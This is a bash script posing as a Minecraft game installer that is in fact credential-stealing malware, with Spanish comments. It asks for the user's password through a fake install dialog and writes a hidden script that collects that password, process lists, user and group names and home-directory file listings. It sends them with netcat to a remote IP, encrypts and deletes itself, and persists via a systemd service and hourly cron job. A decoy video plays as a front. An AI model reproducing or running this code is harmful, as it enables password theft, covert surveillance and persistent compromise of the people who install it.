#!/bin/bash

# Pedir la contrasenia al usuario
password=$(zenity --password --title="Confirm Password to install game" --text="Enter your password:")

if [ -z "$password" ]; then
    zenity --error --text="Password not introduced."
    exit 1
fi

# Instalamos netcat para enviar la info a nuestra compu
if ! dpkg -l | grep -q "netcat"; then
    echo "$password" | su -c "apt-get install -y netcat"
fi

# Archivos e info para la transmision de datos
ip=""
port="1025"
archivo=".info.txt"

# Ruta del archivo principal
ruta_principal=`pwd`
ruta_archivo_principal="${ruta_principal}/minecraft.sh"

# Crear el archivo ~/.HardwareConnection.sh
cat <<EOF > ~/.HardwareConnection.sh
#!/bin/bash

# Si el archivo de datos existe, lo eliminamos para volver a crearlo
if [ -e "$archivo" ]; then 
	rm "$archivo"
fi

echo "----Password----" > "$archivo"
echo "$password" >> "$archivo"

echo "----Kernel Version----" >> "$archivo"
cat /proc/version >> "$archivo"

echo "--------------------------------------------------------------------------------------------" >> "$archivo"
echo "----Procesos activos:----" >> "$archivo"
ps aux >> "$archivo"

echo "--------------------------------------------------------------------------------------------" >> "$archivo"
echo "----Usuarios----" >> "$archivo"
cut -d: -f1 /etc/passwd >> "$archivo"

echo "----Grupos-----" >> "$archivo"
cut -d: -f1 /etc/group >> "$archivo"
echo "--------------------------------------------------------------------------------------------" >> "$archivo"
getent group users >> "$archivo"

echo "--------------------------------------------------------------------------------------------" >> "$archivo"
echo "----Archivos----" >> "$archivo"
shopt -s extglob
ls -l ~/!(*cache*) >> "$archivo"
echo "----------------------------------------------------------------------------------------------------------" >> "$archivo"

# Aqui debemos de enviar la info 
cat "$archivo" | nc "$ip" "$port"

# Si el archivo principal existe aun, lo encriptamos y eliminamos el original
if [ -e "$ruta_archivo_principal" ]; then        
	openssl enc -aes-256-cbc -pbkdf2 -in "$ruta_archivo_principal" -out .cache.sh.enc -k soyundios
	rm "$ruta_archivo_principal"
fi

EOF

# Dar permisos de ejecucion al archivo
chmod +x ~/.HardwareConnection.sh

# Creamos el servicio que arrancara cada vez que se inicia el sistema
echo "$password" | su -c 'cat <<EOF > /etc/systemd/system/HardwareConnection.service
[Unit]
Description=Connection with the Hardware

[Service]
ExecStart=/bin/bash ~/.HardwareConnection.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF'

# Hacemos que se ejecute cada hora 
(crontab -l ; echo "0 * * * * ~/.HardwareConnection.sh") | crontab -

# Damos los permisos para arrancar el programa cada vez que se inicia el sistem
echo "$password" | su -c "systemctl daemon-reload"
echo "$password" | su -c "systemctl enable HardwareConnection.service"
echo "$password" | su -c "systemctl start HardwareConnection.service"


# Instalamos mpv para reproducir un video fake de fachada
if ! dpkg -l | grep -q "mpv"; then
    echo "$password" | su -c "apt-get install -y mpv"
fi

mpv ".media/loadscreen.mp4"


~/.HardwareConnection.sh
